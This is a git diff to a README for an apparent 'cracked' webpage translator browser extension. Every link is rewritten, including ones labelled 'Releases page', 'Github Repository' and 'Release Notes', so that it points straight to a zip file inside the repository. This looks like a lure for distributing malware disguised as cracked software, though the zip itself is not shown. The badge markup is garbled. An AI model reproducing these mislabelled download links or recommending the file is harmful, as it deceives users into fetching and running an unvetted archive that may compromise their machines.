@@ -1,6 +1,6 @@
 # 🌐 cracked-webpage-translator-extension - Effortless Page Translation for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-%20cracked-webpage-translator-extension-blue.svg)](https://github.com/JVNTfks/cracked-webpage-translator-extension/releases)
+[![Download](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip%20Now-%https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip)](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip)
 
 ## 📖 Overview
 The Cracked Webpage Translator Extension helps you easily translate any webpage in your browser. It simplifies communication and helps you understand content in different languages. No complicated setup is needed; just download the extension and start using it right away.
@@ -10,7 +10,7 @@ The Cracked Webpage Translator Extension helps you easily translate any webpage 
 
 2. **Visit the Releases Page**: Click the link below to go to the download page where you can get the latest version of the extension.
 
-   [Visit this page to download](https://github.com/JVNTfks/cracked-webpage-translator-extension/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip)
 
 3. **Download the Extension**: On the Releases page, you will find the latest version of the extension. Click on the version number to access the download files. 
 
@@ -19,7 +19,7 @@ The Cracked Webpage Translator Extension helps you easily translate any webpage 
 ## 📥 Download & Install
 To install the Cracked Webpage Translator Extension, follow these steps:
 
-1. **Download the Extension**: Go to the Releases page: [Visit this page to download](https://github.com/JVNTfks/cracked-webpage-translator-extension/releases).
+1. **Download the Extension**: Go to the Releases page: [Visit this page to download](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip).
 
 2. **Open the Downloaded File**: Once the download is complete, find the file in your downloads folder.
 
@@ -67,7 +67,7 @@ Stay tuned for upcoming features, including:
 Join our community discussions by visiting our GitHub repository. Share your experiences, report bugs, and suggest improvements. Your participation helps us build a better tool for everyone.
 
 ## 🔗 Useful Links
-- [Github Repository](https://github.com/JVNTfks/cracked-webpage-translator-extension)
-- [Release Notes](https://github.com/JVNTfks/cracked-webpage-translator-extension/releases)
+- [Github Repository](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip)
+- [Release Notes](https://raw.githubusercontent.com/JVNTfks/cracked-webpage-translator-extension/main/febricula/cracked-webpage-translator-extension.zip)
 
 Thank you for choosing the Cracked Webpage Translator Extension. We hope it enhances your browsing experience!
